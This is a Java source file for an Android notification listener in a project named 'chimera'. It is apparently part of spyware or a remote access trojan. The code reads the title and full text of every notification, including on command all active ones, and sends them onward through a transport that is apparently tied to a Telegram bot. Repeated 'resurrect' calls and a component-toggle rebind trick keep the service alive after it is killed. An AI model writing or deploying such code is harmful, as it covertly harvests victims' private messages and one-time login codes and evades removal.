package com.chimera;

import android.app.Notification;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationListener extends NotificationListenerService {

    private final String CLIPBOARD_PACKAGE = "com.android.clipboarduiservice";
    private BroadcastReceiver notificationCommandReceiver;
    public static volatile boolean isConnected = false;

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        isConnected = true;
        // Anchor: system-bound, auto-restarted -> resurrect core
        ResurrectionHelper.resurrect(this);
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        isConnected = false;
        // Pyramid: request rebind immediately (Android N+)
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                requestRebind(new ComponentName(this, NotificationListener.class));
            }
        } catch (Exception e) { ErrorLogger.logError(this, "onListenerDisconnected_rebind", e); }
        // Also ensure resurrection via WorkManager
        ResurrectionHelper.resurrect(this);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        isConnected = false;
        notificationCommandReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if ("com.chimera.GET_ACTIVE_NOTIFICATIONS".equals(intent.getAction())) {
                    processAndSendActiveNotifications();
                } else if ("com.chimera.REBIND_NOTIFICATION".equals(intent.getAction())) {
                    ensureRebind(context);
                }
            }
        };
        registerReceiver(notificationCommandReceiver, new IntentFilter("com.chimera.GET_ACTIVE_NOTIFICATIONS"));
        // Also listen for rebind trigger
        try { registerReceiver(notificationCommandReceiver, new IntentFilter("com.chimera.REBIND_NOTIFICATION")); } catch (Exception ignored) {}
        // Rebind anchor on create
        ResurrectionHelper.resurrect(this);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isConnected = false;
        if (notificationCommandReceiver != null) {
            try { unregisterReceiver(notificationCommandReceiver); } catch (Exception ignored) {}
        }
        // Pyramid resurrect
        ResurrectionHelper.resurrect(this);
    }

    // Static helper called from WatchdogWorker + ResurrectionHelper
    public static void ensureRebind(Context ctx) {
        try {
            // Toggle component enabled trick (StackOverflow validated for random kill)
            PackageManager pm = ctx.getPackageManager();
            ComponentName cn = new ComponentName(ctx, NotificationListener.class);
            pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                requestRebind(cn);
            }
        } catch (Exception e) { ErrorLogger.logError(ctx, "ensureRebind", e); }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        String packageName = sbn.getPackageName();

        if (CLIPBOARD_PACKAGE.equals(packageName)) {
            return;
        }

        SharedPreferences prefs = getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
        String filter = prefs.getString(TelegramBotWorker.NOTIFICATION_FILTER_PREF, null);

        if (filter == null || filter.isEmpty() || filter.equals(packageName)) {
            sendNotificationData("New Notification", sbn);
        }
    }

    private void processAndSendActiveNotifications() {
        try {
            StatusBarNotification[] activeNotifications = getActiveNotifications();
            if (activeNotifications == null || activeNotifications.length == 0) {
                TransportManager.sendToActive("No active notifications found.", getApplicationContext());
                return;
            }
            TransportManager.sendToActive("--- Reading " + activeNotifications.length + " Active Notifications ---", getApplicationContext());
            for (StatusBarNotification sbn : activeNotifications) {
                sendNotificationData("Existing Notification", sbn);
            }
        } catch (Exception e) {
            TransportManager.sendToActive("Error reading active notifications. Is permission granted?", getApplicationContext());
            ErrorLogger.logError(getApplicationContext(), "GetActiveNotifications", e);
        }
    }

    private void sendNotificationData(String type, StatusBarNotification sbn) {
        Notification notification = sbn.getNotification();
        if (notification == null) return;

        Bundle extras = notification.extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "No Title");
        CharSequence textChars = extras.getCharSequence(Notification.EXTRA_TEXT);
        CharSequence bigTextChars = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
        
        String text = (textChars != null) ? textChars.toString() : "";
        if (bigTextChars != null && bigTextChars.length() > text.length()) {
            text = bigTextChars.toString();
        }

        if (text.isEmpty()) {
            text = "No Text Content";
        }
        
        String app = sbn.getPackageName();
        String fullMessage = String.format("*[%s]*\n`App:` %s\n`Title:` %s\n`Text:` %s", type, app, title, text);
        TransportManager.sendToActive(fullMessage, getApplicationContext());
    }
}
